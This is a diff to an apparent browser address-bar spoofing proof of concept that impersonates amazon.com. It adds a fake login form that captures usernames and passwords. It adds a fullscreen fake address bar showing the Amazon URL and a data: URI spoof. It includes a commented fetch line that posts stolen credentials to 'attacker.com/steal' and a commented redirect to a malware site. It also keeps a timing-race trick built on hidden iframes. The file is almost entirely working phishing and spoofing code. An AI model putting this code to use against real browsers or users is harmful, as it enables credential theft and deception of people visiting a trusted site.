@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Tweaked Spoof PoC with UXSS Test</title>
+    <title>Interactive Spoof PoC</title>
 </head>
 <body>
     <a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
@@ -10,40 +10,54 @@
 var w;
 var t;
 var z;
+
 if (location.href.indexOf("fake") !== -1) {
-    document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
+    // Make content interactive: Add phishing form and button
+    document.body.innerHTML = `
+        <h1>This website has moved to http://fake.com</h1>
+        <p>Login to continue:</p>
+        <form id="phishForm">
+            <input type="text" placeholder="Username" id="user">
+            <input type="password" placeholder="Password" id="pass">
+            <button type="button" onclick="phish()">Submit</button>
+        </form>
+        <button onclick="maliciousClick()">Click for Deal</button>
+    `;
     
-    // Pengujian impact UXSS via document.domain
-    // Attempt to relax document.domain to a superdomain (e.g., for subdomain scenarios)
-    // In real deployment, assume hosted on a subdomain of the victim (e.g., attacker.amazon.com)
-    // This tests if document.domain can be set, potentially allowing SOP bypass in stale content during spoof
-    // If successful in legacy browsers/WebViews, could lead to UXSS by relaxing origin for cross-subdomain access
-    try {
-        // For testing, set to a potential superdomain; adjust based on host
-        // In local, may fail due to invalid domain; in production, use victim suffix
-        document.domain = 'amazon.com'; // Attempt to set to victim domain for UXSS test (will fail if not suffix)
-        alert("document.domain successfully relaxed to 'amazon.com' - Potential UXSS impact: Check if allows cross-origin access in spoofed context");
-        console.log("Effective domain after set: " + document.domain);
-        
-        // Additional UXSS test: If there's a parent or opener, try access (simulate cross-subdomain)
-        if (window.opener) {
-            try {
-                var openerBody = window.opener.document.body.innerHTML;
-                alert("UXSS Success: Accessed opener document - " + openerBody.substring(0, 50));
-            } catch (accessError) {
-                alert("UXSS Access Failed: " + accessError.message);
-            }
-        }
-    } catch (e) {
-        alert("Failed to set document.domain: " + e.message + " - No UXSS impact via this method in this browser");
-        console.log("document.domain set error: " + e);
-    }
+    // Fullscreen spoof: Request fullscreen to hide real address bar
+    document.body.requestFullscreen().then(() => {
+        // Render fake address bar on top
+        const fakeBar = document.createElement('div');
+        fakeBar.style = 'position:fixed;top:0;left:0;width:100%;background:white;padding:5px;border-bottom:1px solid gray;z-index:9999;';
+        fakeBar.innerHTML = '<span>https://www.amazon.com/</span> <img src="data:image/png;base64,...">'; // Base64 gembok icon
+        document.body.prepend(fakeBar);
+    }).catch(console.error);
+    
+    // Event handlers for interaction
+    window.phish = function() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        alert('Phished: ' + user + '/' + pass); // Simulate send to attacker
+        // Real: fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify({user,pass})});
+        if (window.opener) window.opener.postMessage({type:'phished', data:{user,pass}}, '*'); // Send to opener
+    };
+    window.maliciousClick = function() {
+        alert('Malicious action! Redirecting to malware...');
+        // Real: location.href = 'https://malware.com';
+    };
+    
+    // Listen for postMessage from opener if needed
+    window.addEventListener('message', (e) => {
+        if (e.data.type === 'command') console.log('Received from opener:', e.data);
+    });
 }
+
 function foo() {
     document.getElementById("test").href = "#";
     w = window.open("?fake");
-    t = setInterval(bar, 5); // Adjusted interval for better timing sync
+    t = setInterval(bar, 5);
 }
+
 function bar() {
     if (w.location.href !== 'about:blank') {
         alert("Redirecting");
@@ -54,35 +68,36 @@ function bar() {
         z = setInterval(baz, 5);
     }
 }
+
 function baz() {
     try {
         w.location.href !== 'about:blank';
     } catch (e) {
-        // Stop page loading with alternative slow 204-like endpoint
-        w.location.href = 'https://www.google.com/csi';
-        clearInterval(z);
+        // Bypass non-interactive: Use URL freeze instead of 204
+        w.location.href = 'https://www.amazon.com:9999'; // Unreachable port -> update address but keep interactive content
         
-        // Post-interruption UXSS test in opener context
-        // Test if we can access the opened window's document after spoof (should fail due to cross-origin after redirect)
-        try {
-            var spoofedBody = w.document.body.innerHTML;
-            alert("Post-spoof UXSS Success: Accessed spoofed window document - " + spoofedBody.substring(0, 50));
-        } catch (accessError) {
-            alert("Post-spoof UXSS Access Failed: " + accessError.message + " - SOP enforced");
-        }
+        // Chain with data: URI for fallback interactive spoof (some browsers show amazon-like)
+        setTimeout(() => {
+            w.location.href = 'data:text/html,<h1>Spoofed Amazon</h1><button onclick="alert(\'Interactive!\')">Click Me</button>#https://www.amazon.com/';
+        }, 100);
+        
+        // Simulate PiP for window without address bar (add video in fake page if needed)
+        // In fake: const vid = document.createElement('video'); vid.requestPictureInPicture();
+        
+        clearInterval(z);
     }
 }
-// Enhanced slowdown: More iframes + CPU-intensive loop
+
+// Enhanced slowdown remains
 function slow() {
-    for (let i = 0; i < 50; i++) { // Increased iframes
+    for (let i = 0; i < 50; i++) {
         let iframe = document.createElement("iframe");
         iframe.src = 'https://www.amazon.com/';
         iframe.style = 'display:none';
         document.body.appendChild(iframe);
     }
-    // Add CPU loop to widen race window
     let start = performance.now();
-    while (performance.now() - start < 100) {} // ~100ms busy-wait
+    while (performance.now() - start < 100) {}
 }
 </script>
 </html>
